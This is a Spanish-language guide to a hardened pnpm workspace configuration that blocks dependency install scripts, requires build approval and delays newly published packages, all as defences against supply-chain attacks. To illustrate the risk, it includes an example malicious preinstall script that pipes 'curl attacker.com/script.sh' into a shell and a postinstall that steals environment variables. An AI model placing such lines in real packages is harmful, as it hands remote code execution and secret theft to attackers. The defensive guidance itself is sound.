# Configuración segura de pnpm

Este documento describe la configuración aplicada en `pnpm-workspace.yaml` para endurecer la instalación de dependencias, reducir riesgos por scripts maliciosos y mantener un comportamiento más controlado del gestor de paquetes.

## Archivo configurado

```yaml
# pnpm-workspace.yaml

packages:
  - "."

# =========================================================
# Seguridad: scripts de instalación
# =========================================================

ignoreScripts: true
enablePrePostScripts: false
strictDepBuilds: true
dangerouslyAllowAllBuilds: false
allowBuilds: {}

# =========================================================
# Seguridad: estabilidad contra paquetes recién publicados
# =========================================================

minimumReleaseAge: 1440
minimumReleaseAgeExclude: []

# =========================================================
# Seguridad: resolución estricta
# =========================================================

strictPeerDependencies: true
autoInstallPeers: false
resolvePeersFromWorkspaceRoot: true

# =========================================================
# Optimización / consistencia
# =========================================================

lockfile: true
sharedWorkspaceLockfile: true
dedupePeerDependents: true
preferOffline: true
reporter: append-only

# =========================================================
# Gestión del package manager
# =========================================================

managePackageManagerVersions: true
```

---

# Objetivo de la configuración

El objetivo principal es evitar que dependencias de npm ejecuten código automáticamente durante la instalación.

Algunos paquetes pueden definir scripts como:

```json
{
  "scripts": {
    "preinstall": "node script.js",
    "install": "node install.js",
    "postinstall": "node postinstall.js",
    "prepare": "node prepare.js"
  }
}
```

Estos scripts pueden ser legítimos, por ejemplo para compilar binarios nativos, pero también pueden ser usados como vector de ataque en incidentes de supply-chain.

Esta configuración aplica una política de seguridad basada en:

```txt
bloquear por defecto
revisar manualmente
aprobar únicamente lo necesario
```

---

# Sección `packages`

```yaml
packages:
  - "."
```

Define qué carpetas forman parte del workspace de pnpm.

En este caso:

```yaml
- "."
```

indica que el proyecto raíz es el único paquete del workspace.

## Si el proyecto fuera monorepo

Para un monorepo, se podría cambiar a:

```yaml
packages:
  - "apps/*"
  - "packages/*"
```

O en proyectos mixtos:

```yaml
packages:
  - "."
  - "assets"
  - "apps/*"
  - "packages/*"
```

---

# Seguridad: scripts de instalación

## `ignoreScripts: true`

```yaml
ignoreScripts: true
```

Evita que pnpm ejecute scripts definidos en el `package.json` del proyecto y de sus dependencias durante la instalación.

Esto bloquea scripts como:

```txt
preinstall
install
postinstall
prepare
```

Es una de las medidas principales para reducir el riesgo de dependencias comprometidas que intenten ejecutar código al instalarse.

## Riesgo que mitiga

Evita escenarios donde una dependencia maliciosa haga algo como:

```json
{
  "scripts": {
    "postinstall": "node steal-env.js"
  }
}
```

o:

```json
{
  "scripts": {
    "preinstall": "curl attacker.com/script.sh | sh"
  }
}
```

## Consideración importante

Esta opción puede romper paquetes legítimos que necesitan compilar o descargar binarios durante la instalación.

Ejemplos comunes:

```txt
esbuild
sharp
sqlite3
better-sqlite3
playwright
electron
node-sass
@swc/core
```

Si una dependencia legítima necesita ejecutar scripts, debe aprobarse explícitamente.

---

## `enablePrePostScripts: false`

```yaml
enablePrePostScripts: false
```

Evita que pnpm ejecute automáticamente scripts `pre` y `post` asociados a scripts propios del proyecto.

Por ejemplo, si el `package.json` contiene:

```json
{
  "scripts": {
    "predev": "echo antes",
    "dev": "vite",
    "postdev": "echo despues"
  }
}
```

Con esta configuración, al ejecutar:

```bash
pnpm dev
```

pnpm no debería ejecutar automáticamente:

```bash
pnpm predev
pnpm postdev
```

Esto reduce ejecuciones implícitas y hace que el comportamiento sea más predecible.

---

## `strictDepBuilds: true`

```yaml
strictDepBuilds: true
```

Hace que la instalación falle si existen dependencias con scripts de build no revisados.

En lugar de permitir que los scripts se ejecuten automáticamente, pnpm obliga a revisar qué dependencias quieren ejecutar scripts.

## Comportamiento esperado

Si una dependencia intenta ejecutar scripts de instalación y no está aprobada, pnpm puede mostrar un error o advertencia indicando que hay builds ignorados/no revisados.

La acción correcta no es abrir permisos globales, sino revisar y aprobar solo los paquetes necesarios.

---

## `dangerouslyAllowAllBuilds: false`

```yaml
dangerouslyAllowAllBuilds: false
```

Impide que todas las dependencias ejecuten scripts automáticamente.

Esta opción debe permanecer en `false`.

## Por qué no debe activarse

No se recomienda usar:

```yaml
dangerouslyAllowAllBuilds: true
```

porque permitiría que cualquier dependencia directa o transitiva ejecute scripts de instalación, incluyendo dependencias futuras que podrían introducirse por actualizaciones.

Esto debilitaría la política de seguridad del proyecto.

---

## `allowBuilds: {}`

```yaml
allowBuilds: {}
```

Define una lista explícita de paquetes autorizados o bloqueados para ejecutar scripts de build.

Inicialmente se deja vacío para aplicar una política estricta.

## Ejemplo de uso

Si después de revisar una dependencia se determina que `esbuild` necesita ejecutar scripts legítimos, se podría aprobar así:

```yaml
allowBuilds:
  esbuild: true
```

Si se quiere bloquear explícitamente un paquete:

```yaml
allowBuilds:
  core-js: false
```

## Forma recomendada de administrar esta lista

Usar:

```bash
pnpm approve-builds
```

Ese comando permite revisar interactivamente las dependencias que quieren ejecutar scripts de build.

Las dependencias aprobadas se agregan a `allowBuilds` con valor `true`.

Las dependencias rechazadas se agregan con valor `false`.

---

# Seguridad: estabilidad contra paquetes recién publicados

## `minimumReleaseAge: 1440`

```yaml
minimumReleaseAge: 1440
```

Evita instalar versiones que fueron publicadas recientemente.

El valor está expresado en minutos.

```txt
1440 minutos = 24 horas
```

## Objetivo

Mitigar ataques donde una versión maliciosa se publica en npm y se retira poco después.

Con esta configuración, el proyecto evita instalar versiones demasiado recientes, dando margen para que la comunidad, herramientas de seguridad o el propio registro detecten anomalías.

## Trade-off

Puede impedir instalar inmediatamente una versión legítima recién publicada.

Esto es aceptable en proyectos donde se prioriza seguridad y estabilidad sobre disponibilidad inmediata de versiones nuevas.

---

## `minimumReleaseAgeExclude: []`

```yaml
minimumReleaseAgeExclude: []
```

Permite excluir ciertos paquetes de la regla `minimumReleaseAge`.

Actualmente está vacío, por lo que todos los paquetes respetan la espera mínima configurada.

## Ejemplo

Si en algún caso se necesitara excluir un paquete interno:

```yaml
minimumReleaseAgeExclude:
  - "@empresa/paquete-interno"
```

No debe usarse para excluir paquetes externos sin una razón clara.

---

# Seguridad: resolución estricta

## `strictPeerDependencies: true`

```yaml
strictPeerDependencies: true
```

Hace que pnpm sea estricto con conflictos de peer dependencies.

Esto ayuda a detectar problemas de compatibilidad en lugar de permitir instalaciones ambiguas.

## Ventaja

Evita que el proyecto funcione “por accidente” con versiones incompatibles de dependencias compartidas.

## Posible impacto

Puede causar errores de instalación si algunas librerías tienen peer dependencies mal declaradas o incompatibles.

En esos casos, lo correcto es resolver explícitamente las versiones necesarias.

---

## `autoInstallPeers: false`

```yaml
autoInstallPeers: false
```

Evita que pnpm instale automáticamente peer dependencies faltantes.

## Objetivo

Obliga a declarar explícitamente las dependencias que el proyecto necesita.

Esto reduce instalaciones implícitas y hace más claro el árbol de dependencias real.

---

## `resolvePeersFromWorkspaceRoot: true`

```yaml
resolvePeersFromWorkspaceRoot: true
```

Permite resolver peer dependencies desde la raíz del workspace.

Esto ayuda a mantener consistencia en proyectos con workspace o estructuras donde varias partes comparten dependencias comunes.

---

# Optimización y consistencia

## `lockfile: true`

```yaml
lockfile: true
```

Mantiene activo el archivo `pnpm-lock.yaml`.

El lockfile es obligatorio para instalaciones reproducibles.

## Recomendación

El archivo `pnpm-lock.yaml` debe versionarse en Git.

No debe agregarse al `.gitignore`.

---

## `sharedWorkspaceLockfile: true`

```yaml
sharedWorkspaceLockfile: true
```

Usa un único lockfile compartido para todo el workspace.

Esto facilita que todos los paquetes del proyecto usen una resolución consistente de dependencias.

---

## `dedupePeerDependents: true`

```yaml
dedupePeerDependents: true
```

Permite que pnpm deduplique dependencias relacionadas con peer dependencies cuando sea posible.

## Beneficio

Reduce duplicados innecesarios dentro del lockfile y del árbol de dependencias.

---

## `preferOffline: true`

```yaml
preferOffline: true
```

Indica a pnpm que prefiera usar el store local cuando sea posible.

## Beneficio

Puede acelerar instalaciones cuando las dependencias ya existen en la caché local.

## Consideración

No significa que pnpm nunca use internet. Si falta una dependencia o se requiere resolver algo nuevo, pnpm puede consultar el registro.

---

## `reporter: append-only`

```yaml
reporter: append-only
```

Hace que la salida en consola sea menos dinámica y más amigable para logs.

Es útil en CI/CD o terminales donde las salidas interactivas pueden ser molestas.

---

# Gestión del package manager

## `managePackageManagerVersions: true`

```yaml
managePackageManagerVersions: true
```

Permite que pnpm respete la versión declarada en el campo `packageManager` del `package.json`, cuando aplique.

Ejemplo:

```json
{
  "packageManager": "pnpm@10.26.0"
}
```

Esto ayuda a que todos los desarrolladores usen una versión consistente de pnpm.

## Nota de compatibilidad

En versiones nuevas de pnpm, esta configuración puede cambiar o ser reemplazada por opciones como `pmOnFail`.

Si pnpm muestra advertencias sobre esta clave, se debe revisar la versión actual de pnpm y ajustar la configuración.

---

# Flujo recomendado de instalación

## Instalación segura

```bash
pnpm install --ignore-scripts
```

## Instalación segura en CI/CD

```bash
pnpm install --frozen-lockfile --ignore-scripts
```

## Revisar dependencias que requieren scripts

```bash
pnpm approve-builds
```

## Aprobar solo lo necesario

Después de ejecutar `pnpm approve-builds`, revisar los cambios en:

```txt
pnpm-workspace.yaml
pnpm-lock.yaml
```

No aprobar dependencias sin entender por qué necesitan ejecutar scripts.

---

# Política recomendada

La política general del proyecto debe ser:

```txt
1. No ejecutar scripts durante instalación por defecto.
2. No permitir builds automáticos de dependencias desconocidas.
3. Revisar manualmente dependencias que requieran scripts.
4. Aprobar solo paquetes estrictamente necesarios.
5. Versionar pnpm-workspace.yaml y pnpm-lock.yaml.
6. Usar --frozen-lockfile en CI/CD.
```

---

# Dependencias que pueden requerir revisión especial

Algunas dependencias legítimas suelen necesitar scripts para descargar binarios, compilar módulos nativos o preparar archivos.

Ejemplos:

```txt
esbuild
sharp
sqlite3
better-sqlite3
playwright
electron
node-sass
@swc/core
@parcel/watcher
```

Si el proyecto usa una de estas dependencias, puede ser necesario aprobarla explícitamente con:

```bash
pnpm approve-builds
```

o configurarla manualmente:

```yaml
allowBuilds:
  esbuild: true
```

---

# Configuración que no debe usarse

No se debe usar:

```yaml
dangerouslyAllowAllBuilds: true
```

Tampoco se recomienda desactivar la política estricta sin justificación:

```yaml
strictDepBuilds: false
```

Ni permitir scripts globalmente sin revisión.

---

# Resumen

Esta configuración endurece pnpm contra ataques de supply-chain relacionados con scripts de instalación.

El proyecto queda configurado para:

```txt
bloquear scripts por defecto
fallar ante builds no revisados
evitar paquetes demasiado recientes
hacer resolución estricta de dependencias
mantener instalaciones reproducibles
```

El costo es que algunas dependencias legítimas pueden requerir aprobación manual.

Ese costo es intencional y forma parte de la política de seguridad.
